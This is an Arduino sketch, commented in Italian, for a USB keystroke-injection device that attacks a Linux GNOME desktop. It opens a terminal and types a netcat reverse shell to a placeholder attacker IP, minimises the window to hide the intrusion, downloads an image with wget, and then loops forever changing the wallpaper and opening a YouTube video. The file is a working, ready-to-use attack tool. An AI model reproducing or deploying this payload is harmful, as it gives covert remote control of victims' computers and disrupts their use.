#include <Adafruit_NeoPixel.h>
#include <Keyboard.h>

#ifdef __AVR__
 #include <avr/power.h> // Required for 16 MHz Adafruit Trinket
#endif


#define PIXEL_PIN    23  // Digital IO pin connected to the NeoPixels.

#define PIXEL_COUNT 1 // Number of NeoPixels

// Declare our NeoPixel strip object:
Adafruit_NeoPixel strip(PIXEL_COUNT, PIXEL_PIN, NEO_GRB + NEO_KHZ800);
// Argument 1 = Number of pixels in NeoPixel strip
// Argument 2 = Arduino pin number (most are valid)
// Argument 3 = Pixel type flags, add together as needed:
//   NEO_KHZ800  800 KHz bitstream (most NeoPixel products w/WS2812 LEDs)
//   NEO_GRB     Pixels are wired for GRB bitstream (most NeoPixel products)

//colori usati per simulare le attività del mouse, blue indica che il codice sta venendo eseguito, red è stand-by
uint32_t red = strip.Color(255, 0, 0);
uint32_t blue = strip.Color(0, 0, 255);


void setup() {
  Keyboard.begin(KeyboardLayout_it_IT);
  strip.begin(); // Initialize NeoPixel strip object (REQUIRED)
  strip.setPixelColor(0,red);
  strip.show();  //rosso di stand-by
  //15 second attesa
  delay(15000);
  strip.setPixelColor(0,blue); //l'attacco sta cominciando, il led diventa blu
  strip.show();
  
//prima shell
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.press(KEY_LEFT_ALT);
  delay(450);
  Keyboard.write('t');
  delay(50);
  Keyboard.releaseAll();
  
  //reverse shell attaccante
  delay(820);
  Keyboard.print("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 5555 >/tmp/f"); ////MODIFICARE QUESTO INDIRIZZO IP CON QUELLO DELL'ATTACCANTE
  //per capire cosa fa questo comando suggerisco la visione del seguente video
  //https://youtu.be/_q_ZCy-hEqg
  delay(30);
  Keyboard.write(KEY_RETURN);
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(50);
  Keyboard.write('h');//minimizziamo la finestra su cui sta girando netcat per occultare l'intrusione 
  delay(50);  
  Keyboard.releaseAll();
  delay(100);
    
  //seconda shell
  Keyboard.press(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.press(KEY_LEFT_ALT);
  delay(350);
  Keyboard.write('t');
  delay(30);  
  Keyboard.releaseAll();
  delay(500);  
  Keyboard.print ("wget -O /tmp/fuck https://cdn.shopify.com/s/files/1/0604/4801/products/Pirate_1_b0a169e0-feba-450d-b81b-f3db5703c7d4.jpeg?v=1514697320");
  delay(30);                    //scarichiamo l'immagine da sostituire allo sfondo e aspettiamo 5 secondi per assicurarci che l'abbia scaricata
  Keyboard.write(KEY_RETURN);
  delay(5000);
      
}

void loop() {
  //QUESTO E' IL LOOP INFINITO, USARE CON CAUTELA ##############################################################
      Keyboard.press(KEY_LEFT_CTRL);
      delay(30);
      Keyboard.press(KEY_LEFT_ALT);
      delay(30);
      Keyboard.write('t');
      delay(30);
      Keyboard.releaseAll();
      delay(500);
      Keyboard.print("gsettings set org.gnome.desktop.background picture-uri file:////tmp/fuck");
      delay(30);  //cambiamo lo sfondo
      Keyboard.write(KEY_RETURN);
      delay(100);
  //video yt
     Keyboard.print("firefox https://youtu.be/Ic2Cjw7kydI");
     delay(50);
     Keyboard.write(KEY_RETURN);
     delay(8000);
     Keyboard.write(' ');
     delay(3000);

}
